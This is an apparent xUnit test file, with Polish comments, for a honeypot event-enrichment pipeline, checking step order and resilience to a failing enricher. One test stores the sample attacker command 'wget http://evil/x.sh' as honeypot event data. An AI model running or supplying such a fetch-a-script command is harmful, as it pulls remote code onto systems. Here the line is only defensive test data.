using HoneyGrid.Contracts;
using HoneyGrid.Ingestion.Enrichment;
using Microsoft.Extensions.Logging.Abstractions;

namespace HoneyGrid.Ingestion.Tests;

/// <summary>Kompozycja pipeline'u: kolejność kroków i odporność na wyjątki enricherów.</summary>
public sealed class EnrichmentPipelineTests
{
    /// <summary>Enricher-lambda do budowania scenariuszy testowych.</summary>
    private sealed class DelegateEnricher(Func<HoneypotEvent, HoneypotEvent> enrich) : IEventEnricher
    {
        public ValueTask<HoneypotEvent> EnrichAsync(HoneypotEvent evt, CancellationToken ct) =>
            ValueTask.FromResult(enrich(evt));
    }

    [Fact]
    public async Task Enrichers_RunInOrder_LaterSeesEarlierResult()
    {
        // Pierwszy krok dodaje geo, drugi buduje threatIntel NA PODSTAWIE geo —
        // dowód, że wynik kroku N jest wejściem kroku N+1.
        var first = new DelegateEnricher(evt => evt with
        {
            Geo = new GeoInfo { Country = "PL", Asn = "AS5617" },
        });
        var second = new DelegateEnricher(evt => evt with
        {
            ThreatIntel = new ThreatIntelInfo
            {
                KnownMalicious = evt.Geo?.Country == "PL",
                Sources = [$"test:{evt.Geo?.Asn}"],
            },
        });

        var pipeline = new EnrichmentPipeline([first, second], NullLogger<EnrichmentPipeline>.Instance);

        var result = await pipeline.EnrichAsync(TestHelpers.SampleEvent(), CancellationToken.None);

        Assert.Equal("PL", result.Geo!.Country);
        Assert.True(result.ThreatIntel!.KnownMalicious);
        Assert.Equal(["test:AS5617"], result.ThreatIntel.Sources);
    }

    [Fact]
    public async Task ThrowingEnricher_IsSkipped_RestOfPipelineRuns()
    {
        var first = new DelegateEnricher(evt => evt with { Geo = new GeoInfo { Country = "DE" } });
        var throwing = new DelegateEnricher(_ => throw new InvalidOperationException("awaria enrichera"));
        var third = new DelegateEnricher(evt => evt with { Command = "wget http://evil/x.sh" });

        var pipeline = new EnrichmentPipeline([first, throwing, third], NullLogger<EnrichmentPipeline>.Instance);

        var result = await pipeline.EnrichAsync(TestHelpers.SampleEvent(), CancellationToken.None);

        // Krok 1 i 3 zastosowane, awaria kroku 2 połknięta.
        Assert.Equal("DE", result.Geo!.Country);
        Assert.Equal("wget http://evil/x.sh", result.Command);
    }

    [Fact]
    public async Task EmptyPipeline_ReturnsEventUnchanged()
    {
        var pipeline = new EnrichmentPipeline([], NullLogger<EnrichmentPipeline>.Instance);

        var evt = TestHelpers.SampleEvent();
        var result = await pipeline.EnrichAsync(evt, CancellationToken.None);

        Assert.Same(evt, result);
    }
}
